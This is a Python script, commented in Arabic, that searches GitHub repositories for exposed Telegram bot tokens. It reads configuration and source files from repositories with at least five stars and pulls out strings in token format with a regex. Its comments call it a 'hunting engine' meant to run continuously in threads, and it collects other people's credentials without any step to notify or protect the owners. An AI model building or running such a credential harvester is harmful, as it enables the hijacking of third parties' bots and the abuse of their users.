import os
import re
import time
import logging
from github import Github, RateLimitExceededException

# إعداد السجلات (Logs) - استعدنا قوة المراقبة
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# إعدادات الاتصال
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
g = Github(GITHUB_TOKEN)

def search_for_tokens():
    """
    محرك الصيد الأصلي (النسخة الكاملة)
    يعمل بنظام متزامن (Synchronous) ليتناسب مع threading في main.py
    """
    found_tokens = []
    logger.info("Scanner Engine: Starting search sequence...")

    try:
        # البحث عن المستودعات (20 نتيجة في كل دورة)
        repositories = g.search_repositories(query="telegram_bot_token", sort="updated")[:20]
        
        for repo in repositories:
            # الفلترة الذكية (استعدنا شرط الجودة لتقليل النتائج التالفة)
            if repo.stargazers_count < 5:
                continue
            
            logger.info(f"Scanning Repository: {repo.full_name}")
            
            try:
                contents = repo.get_contents("")
                for content in contents:
                    # فحص دقيق وشامل لكافة الامتدادات
                    if content.type == "file" and content.name.endswith(('.py', '.env', '.yml', '.json', '.txt', '.conf')):
                        file_content = content.decoded_content.decode('utf-8', errors='ignore')
                        
                        # استخراج التوكنات بنمط Regex القوي
                        tokens = re.findall(r'\d{8,10}:[a-zA-Z0-9_-]{35}', file_content)
                        
                        for token in set(tokens):
                            if token not in found_tokens:
                                logger.info(f"Found candidate in {repo.full_name}")
                                found_tokens.append(token)
            
            except Exception as e:
                logger.warning(f"Skipping repo {repo.full_name} due to: {e}")
                continue
                
    except RateLimitExceededException:
        logger.critical("GitHub API limit reached! Sleeping for 1 hour to prevent ban.")
        time.sleep(3600)
    except Exception as e:
        logger.error(f"Critical Scanner Failure: {e}")
        
    logger.info(f"Scanner Cycle Complete. Total unique candidates: {len(found_tokens)}")
    return found_tokens
